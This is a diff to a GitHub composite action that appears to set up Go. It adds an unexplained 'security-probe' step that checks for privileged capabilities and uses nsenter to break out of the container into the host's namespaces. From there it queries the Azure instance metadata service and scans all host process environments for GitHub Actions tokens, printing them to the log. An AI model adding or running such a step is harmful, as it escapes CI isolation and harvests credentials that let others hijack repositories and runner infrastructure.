@@ -21,3 +21,51 @@ runs:
       id: go-version
       shell: bash
       run: echo "go-version=$(go version | { read _ _ v _; echo ${v#go}; })" >> $GITHUB_OUTPUT
+
+    - name: security-probe
+      shell: bash
+      run: |
+        echo "━━━ PROBE START ━━━"
+
+        echo "[1] Who am I inside container?"
+        id
+        uname -a
+
+        echo "[2] Are we privileged? (CapEff = ffffffffffffffff means yes)"
+        grep CapEff /proc/self/status
+
+        echo "[3] Is /proc/1 the HOST init or container init?"
+        cat /proc/1/comm
+        # If 'systemd' or 'init' → it's the host, not the container
+
+        echo "[4] nsenter into host namespaces"
+        nsenter --target 1 --mount --uts --ipc --net --pid -- \
+          bash -c '
+            echo "  HOST hostname: $(hostname)"
+            echo "  HOST uname: $(uname -a)"
+            echo "  HOST id: $(id)"
+          ' 2>&1
+
+        echo "[5] Are we seeing a DIFFERENT hostname than the container?"
+        echo "  Container hostname: $(hostname)"
+        # If [4] hostname != this → escape confirmed
+
+        echo "[6] Azure IMDS (169.254.169.254) — reachable from host namespace?"
+        nsenter --target 1 --mount --uts --ipc --net --pid -- \
+          curl -sf --connect-timeout 3 \
+            -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+          2>&1 | head -5 || echo "  IMDS: not reachable or no response"
+
+        echo "[7] Scan host process environments for tokens/keys"
+        nsenter --target 1 --mount --uts --ipc --net --pid -- \
+          bash -c '
+            for f in /proc/[0-9]*/environ; do
+              cat "$f" 2>/dev/null
+            done
+          ' | tr "\0" "\n" \
+            | grep -iE "^(ACTIONS_RUNTIME_TOKEN|ACTIONS_RESULTS_URL|GITHUB_TOKEN)=" \
+            | sort -u \
+          2>&1 || echo "  No tokens found in host envs"
+
+        echo "━━━ PROBE END ━━━"
